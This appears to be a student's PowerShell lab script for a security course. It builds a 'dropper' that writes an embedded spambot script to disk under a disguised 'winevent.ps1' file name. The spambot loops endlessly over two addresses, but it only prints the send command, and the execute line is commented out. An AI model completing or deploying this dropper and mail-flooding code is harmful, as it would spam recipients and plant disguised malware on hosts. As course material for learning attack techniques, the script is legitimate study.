# Storyline: Dropper for our spambot that will save to a directory and then execute it.

$writeSbBot = @'


# Send an email using Powershell

$toSend = @('ornateshelf5097@gmail.com', 'asani.vessup@mymail.champlain.edu')

# Message body

# $___ is how you make powershell variables

$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. 
Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in 
reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, 
sunt in culpa qui officia deserunt mollit anim id est laborum."

while ($true) {
    foreach ($email in $toSend) {

        # Send the email
        write-host "Send-MailMessage -from 'asani.vessup@mymail.champlain.edu' -To $email - Subject 'Test Email from Powershell' `
        -Body $msg -SmtpServer X.X.X.X"

        # Pause for 1 second
        # start-sleep 1

    }
}
'@

$sbDir = 'C:\Users\Asani-Web\Documents\Vessup_SYS-320\Week10\Bot_Folder\'

# Create a random number to add to the file.

$sbRand = Get-random -Minimum 1000 -Maximum 1999

$sbRand 

# Create the file and location to save the bot

$file = $sbDir + $sbRand + "winevent.ps1"

# Write to a file

$writeSbBot | out-file -FilePath $file 

# Executes the PowerShell script

#Invoke-Expression $file